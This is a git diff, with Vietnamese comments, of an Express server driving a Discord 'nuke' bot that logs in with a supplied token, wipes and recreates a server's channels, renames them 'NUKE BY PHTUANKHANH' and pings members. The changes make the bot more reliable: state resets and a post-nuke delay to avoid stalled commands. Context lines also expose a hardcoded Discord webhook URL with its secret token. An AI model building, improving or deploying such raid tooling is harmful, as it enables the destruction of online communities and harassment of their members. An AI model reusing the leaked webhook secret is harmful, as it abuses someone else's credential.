@@ -8,10 +8,8 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// WEBHOOK THÔNG BÁO
 const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';
 
-// CẤU HÌNH CỐ ĐỊNH (Đã fix ping @everyone ở dòng riêng)
 const CONFIG = {
   channelName: 'anh-phtuankhanh-nuke',
   renameName: 'NUKE BY PHTUANKHANH',
@@ -71,6 +69,7 @@ function startBot(token) {
   if (botClient) {
     botClient.destroy();
     botClient = null;
+    currentClientId = null;
   }
 
   currentToken = token;
@@ -94,6 +93,8 @@ function startBot(token) {
 
     const guild = message.guild;
     const t0 = Date.now();
+    
+    // Gửi reply nếu kênh còn
     message.reply('🚀 Bắt đầu nuke...').catch(() => {});
     pushLog(`Bắt đầu nuke server: ${guild.name}`, 'warn');
 
@@ -149,6 +150,9 @@ function startBot(token) {
       await Promise.allSettled(createPromises);
 
       pushLog(`NUKE HOÀN TẤT trong ${Date.now() - t0}ms!`, 'success');
+      
+      // Đợi 2s để Discord.js cập nhật lại cache kênh mới, tránh kẹt lệnh
+      await new Promise(r => setTimeout(r, 2000));
 
     } catch (err) {
       pushLog(`Lỗi nuke: ${err.message}`, 'error');
@@ -183,17 +187,18 @@ app.post('/api/login', async (req, res) => {
       clientId: botClient.user.id
     });
   } else {
-    res.status(500).json({ error: 'Đăng nhập thất bại, kiểm tra token hoặc Developer Portal' });
+    res.status(500).json({ error: 'Đăng nhập thất bại, kiểm tra token' });
   }
 });
 
 app.post('/api/logout', (req, res) => {
   if (botClient) {
+    // Ép ngắt kết nối WebSocket, xoá token
     botClient.destroy();
     botClient = null;
     currentToken = null;
     currentClientId = null;
-    pushLog('Bot đã tắt.', 'warn');
+    pushLog('Bot đã tắt hoàn toàn.', 'warn');
   }
   res.json({ ok: true });
 });
